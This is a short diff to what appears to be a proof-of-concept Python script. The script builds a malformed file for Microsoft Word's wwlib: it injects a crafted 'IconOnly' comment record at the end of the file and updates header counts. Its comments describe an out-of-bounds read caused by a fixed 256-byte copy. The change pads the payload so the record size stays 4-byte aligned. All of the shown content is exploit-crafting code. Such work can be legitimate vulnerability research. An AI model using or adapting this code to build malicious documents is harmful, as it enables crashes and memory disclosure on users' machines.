@@ -67,8 +67,9 @@ def patch(path_in, path_out, stress=0x7FFF0000):
     # wwlib FRecordRichTextEdit path: cb matches wide L"IconOnly" at rec+0xC then
     # copies a FIXED 256 bytes from rec+0xC regardless of nSize/DataSize.
     # Marker + short tail, record placed last (EOF right after) -> OOB read.
+    # payload must keep nSize 4-byte aligned: 16 + 8 = 24 -> nSize = 36 (0x24)
     inj += build_comment(0x20, (b'I\x00c\x00o\x00n\x00O\x00n\x00l\x00y\x00'
-                                + b'\x00\x00' + b'B' * 4))
+                                + b'\x00\x00' + b'B' * 6))
     d[pos:pos] = inj
     nb, nr = struct.unpack_from('<II', d, 0x30)
     struct.pack_into('<II', d, 0x30, nb + len(inj), nr + 3)
